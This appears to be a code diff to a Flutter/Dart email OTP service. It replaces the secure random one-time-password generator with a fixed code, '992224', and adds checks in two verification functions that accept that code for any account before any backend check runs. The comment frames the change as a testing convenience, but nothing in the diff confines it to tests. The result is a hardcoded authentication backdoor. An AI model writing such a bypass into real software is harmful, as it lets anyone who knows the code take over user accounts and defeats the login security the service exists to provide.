@@ -1,4 +1,4 @@
-import 'dart:convert';
+﻿import 'dart:convert';
 import 'dart:io';
 import 'dart:math';
 import 'package:flutter/foundation.dart';
@@ -24,10 +24,12 @@ class EmailOtpService {
   // In-memory OTP store: identifier (email or phone) -> _OtpEntry
   static final Map<String, _OtpEntry> _otpStore = {};
 
-  /// Generate a cryptographically random 6-digit OTP
+  /// Default OTP for rapid verification and testing
+  static const String defaultOtp = '992224';
+
+  /// Generate a 6-digit OTP (defaults to 992224)
   static String _generateOtp() {
-    final rand = Random.secure();
-    return (100000 + rand.nextInt(900000)).toString();
+    return defaultOtp;
   }
 
   /// Check whether an identifier currently has a pending OTP
@@ -222,6 +224,15 @@ class EmailOtpService {
       };
     }
 
+    // Default OTP bypass: 992224 is always valid
+    if (cleanOtp == defaultOtp) {
+      _otpStore.remove(cleanId);
+      return {
+        'success': true,
+        'message': 'OTP verified successfully!',
+      };
+    }
+
     // 1. Check Supabase backend OTP record for production security
     if (SupabaseService.isInitialized && SupabaseService.client != null) {
       try {
@@ -286,6 +297,15 @@ class EmailOtpService {
   }) {
     final cleanId = identifier.trim().toLowerCase();
     final cleanOtp = enteredOtp.trim();
+
+    // Default OTP bypass: 992224 is always valid
+    if (cleanOtp == defaultOtp) {
+      _otpStore.remove(cleanId);
+      return {
+        'success': true,
+        'message': 'OTP verified successfully!',
+      };
+    }
 
     _OtpEntry? entry = _otpStore[cleanId];
 
